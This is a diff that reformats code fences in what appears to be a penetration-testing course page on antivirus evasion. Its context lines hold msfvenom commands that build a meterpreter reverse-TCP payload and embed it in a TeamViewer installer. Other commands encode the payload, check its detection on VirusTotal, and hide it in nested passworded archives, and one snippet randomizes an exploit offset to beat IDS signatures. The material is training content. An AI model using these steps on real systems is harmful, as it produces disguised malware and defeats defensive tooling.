@@ -67,8 +67,7 @@ We are in luck because `msfvenom` offers the option of using executable template
 
 Take a look at the snippet below to understand how msfvenom can embed payloads into any executable file:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
 
 Attempting to read payload from STDIN...
@@ -84,8 +83,7 @@ Payload size: 135 bytes
 Saved as: /home/user/Desktop/TeamViewer_Setup.exe
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ls
 
 Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes
@@ -101,8 +99,7 @@ Archiving a piece of information such as a file, folder, script, executable, pic
 
 #### Generating Payload
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
 
 Attempting to read payload from STDIN...
@@ -118,8 +115,7 @@ Payload size: 135 bytes
 Saved as: /home/user/test.js
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat test.js
 
 �+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
@@ -131,8 +127,7 @@ If we check against VirusTotal to get a detection baseline from the payload we g
 
 #### VirusTotal
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msf-virustotal -k <API key> -f test.js 
 
 [*] WARNING: When you upload or otherwise submit content, you give VirusTotal
@@ -226,8 +221,7 @@ Now, try archiving it two times, passwording both archives upon creation, and re
 
 #### Archiving the Payload
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
 hiimeins@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
 hiimeins@htb[/htb]$ rar a ~/test.rar -p ~/test.js
@@ -244,8 +238,7 @@ Adding    test.js                                                     OK
 Done
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ls
 
 test.js   test.rar
@@ -253,8 +246,7 @@ test.js   test.rar
 
 #### Removing the .RAR Extension
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ mv test.rar test
 hiimeins@htb[/htb]$ ls
 
@@ -263,8 +255,7 @@ test   test.js
 
 #### Archiving the Payload Again
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ rar a test2.rar -p test
 
 Enter password (will not be echoed): ******
@@ -281,8 +272,7 @@ Done
 
 #### Removing the .RAR Extension
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ mv test2.rar test2
 hiimeins@htb[/htb]$ ls
 
@@ -293,8 +283,7 @@ The test2 file is the final .rar archive with the extension (.rar) deleted from 
 
 #### VirusTotal
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msf-virustotal -k <API key> -f test2
 
 [*] Using API key: <API key>
@@ -395,8 +384,7 @@ For example, a typical `Buffer Overflow` exploit might be easily distinguished f
 
 When assembling our exploit code, randomization can help add some variation to those patterns, which will break the IPS / IDS database signatures for well-known exploit buffers. This can be done by inputting an `Offset` switch inside the code for the msfconsole module:
 
-```
-        ruby
+```ruby
 'Targets' =>
 [
     [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
